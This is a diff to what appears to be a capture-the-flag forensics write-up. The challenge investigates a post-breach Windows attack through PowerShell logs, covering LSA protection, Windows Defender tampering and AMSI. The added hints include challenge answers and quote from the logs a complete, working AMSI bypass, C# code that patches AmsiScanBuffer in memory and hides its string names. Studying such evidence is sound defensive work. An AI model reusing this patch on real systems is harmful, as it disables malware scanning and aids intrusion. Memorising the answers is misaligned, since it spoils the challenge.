@@ -29,11 +29,37 @@ Byte Doctor Reyes is investigating a stealthy post-breach attack where several e
 ### Task 1: The attacker disabled LSA protection on the compromised host by modifying a registry key. What is the full path of that registry key?
 Filter by "HKLM\SYSTEM" in the Windows PowerShell Operational logs to find were the attacker modified the LSA registry key.
 
+
 ### Task 2: Which PowerShell command did the attacker first execute to disable Windows Defender?
-Look in the Windows PowerShell logs for the PowerShell cmdlet of "[Set-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps)"
+Look in the Windows PowerShell logs for the PowerShell cmdlet of "[Set-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps)"; could also search for conditionals with Set-MpPreference such as $true or $false. The first log was executed at '10-04-2025 12:01:35' 
+
 
 ### Task 3: The attacker loaded an AMSI patch written in PowerShell. Which function in the DLL is being patched by the script to effectively disable AMSI?
-
+Search within the Windows-PowerShell-Operational logs for strings relating to '.dll', find that the attacker imported a function named 'Disable-Protection' which modifies 'amsi.dll'. Viewing the full script reveals that it attempts to patch the 'AmsiScanBuffer' function within the DLL.
+```PowerShell
+CommandInvocation(Add-Type): "Add-Type"
+ParameterBinding(Add-Type): name="TypeDefinition"; value="using System;
+using System.Runtime.InteropServices;
+public class P {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static bool Patch() {
+        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
+        if (a == IntPtr.Zero) return false;
+        UInt32 oldProtect;
+        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+        byte[] patch = { 0x31, 0xC0, 0xC3 };
+        Marshal.Copy(patch, 0, a, patch.Length);
+        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
+    }
+}"
+```
 
 ### Task 4: Which command did the attacker use to restart the machine in Safe Mode?
 
